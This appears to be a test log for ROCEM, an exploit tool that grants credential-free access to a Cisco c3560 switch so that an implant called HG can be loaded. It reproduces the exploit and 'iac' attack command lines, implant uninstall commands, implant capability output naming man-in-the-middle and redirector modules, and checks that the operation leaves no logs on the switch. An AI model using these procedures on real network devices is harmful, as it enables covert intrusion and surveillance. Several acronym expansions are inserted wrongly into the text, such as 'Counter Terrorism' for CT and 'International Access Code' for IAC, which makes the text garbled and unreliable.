ROCEM v1.2-Adverse-1r Testing
ROCEM v1.2 was delivered by Xetron on 9/15/2015 to address ROC-12 - EAREnterprise Archive 5471 - ROCEM set/unset does not work with flux.  ROCEM is part of the CONOPConcealed Operation for throwing HG on Adverse.  ROCEM was previously tested and delivered for Adverse.  Regression testing will include test of set/unset feature fixed, test of complete CONOPConcealed Operation for use with HG, test ROCEM interactive session, and ad-hoc tests.  This test will use the Test Setup documented for HG v3.1.3-Adverse-1h.
Testing Summary
 
Testing Notes

Test set/unset feature of ROCEM
DUT configured with target configuration and network setup
DUT is accessed by hopping through three flux nodes as per the CONOP
Reloaded DUTDevice Under Test to start with a clean device
From Adverse ICON machine, set ROCEM:root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -s 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin

Test of Using ROCEM to Load HG
Set ROCEM on DUT
Ran IACInternational Access Code attack - No logs seen on console or buffer, CPU spiked briefly to 32%:root@debian:/home/user1/ops/adverse/adverse-1h/attack/linux# ./iac --ip 192.168.0.254 --l test:test testLGEC -125DHEC -159M

Used remote to upload HG -  No logs seen on console or buffer, CPU 

Did not get expected result code:

When attempting to establish a CTCounter Terrorism session with implant, the UDPUser Datagram Protocol trigger packets are getting acknowledged however I do not get a call back.  Attempted to re-authenticate to proxy from seeds host and restart seeds traffic, no luck.
Wireshark running on ICON VMVirtual Machine shows no attempt made by HG to call back, however I do see the trigger ack packets.
Tried setting an explicit host to impersonate, and it does call back:[192.168.211.10]> capability show[Success]  Name Version  Baseline Unsupported  ACEApplication Control Engine (Module) 26 FilterBroker 22  IV 17  Tunnel 10  DnsCheckin 5  Scramble Unknown  Redirector Unknown  Collector Unknown  PassThrough Unknown  MITMMan-In-The-Middle attack Unknown ************ Success ************[capability show]

HG does list Seeds host as a snooped https client and dns client.  Attempting CTCounter Terrorism Session again without explicit impersonation
Now it is working - CTCounter Terrorism session successful.


Repeat CONOPConcealed Operation - verify result code from remote after HG uploaded
Uninstalled HG - device uninstall -mp -f
Reloaded device to start with a clean device
Set ROCEM
IAC attack
Unset ROCEM
Upload HG with remote - got same unexpected result code - THIS WAS FOUND TO BE DUE TO INCORRECT BOOTLOADER VERSION FOR HG PERSISTENCE.  NOT RELATED TO ROCEM.GOOD - status OK.OP: RUNCODE using Per Second Code address: 0x0299ebdc No data Result: 0xfffffffb

Verified that the unexpected result code is received whether HG is loaded via ROCEM or just IACInternational Access Code alone with creds.  Either way, HG still seems to work.
Created JIRAUser Managment Software (Atlassian) Issue for unexpected result code


Test for Unexpted result code when ROCEM not used - Repeated test, but did not use ROCEM.  Instead supplied IACInternational Access Code with creds.  Still received unexpected result code.  Does not appear to be an issue with ROCEM.

Repeated set/unset commands - 10
Uninstalled HG and reloaded to start with a clean device
Performed 10 iterations of ROCEM set, establish a telnet session without creds, ROCEM unset, establsih that creds are now required.
No messages on console or syslog


ROCEM interactive session
Establish ROCEM interactive session
Session established and I see a vty in use with no user in output of show users as expected:MLS-Sth#show user Line User Host(s) Idle Location* 1 vty 0 idle 00:00:00 192.168.221.40

Issued show commands to survey device
Verified after I excited interactive session that creds are now required
Repeated 10 interactive sessions - successful
Established a telnet session to switch while interactive session was active - was prompted for creds as expected
No logs observed on switch, no spike observed except when show tech was executed as part of survey commands, at which time 5 sec CPU spiked to 29%.


Ad-hoc - issue multple set commands in a row
Started IXIA background traffic - 50M in each direction
Issued 10 set commands in a row - no error messages reported, switch was set
Issued one unset command and verified via telnet that switch was unset
Issued 10 unset commands - no error message, verified by telnet that switch was unset
Set the switch and then logged via telnet as ROCEM user
Issued additional set commands in another window - no errors reported
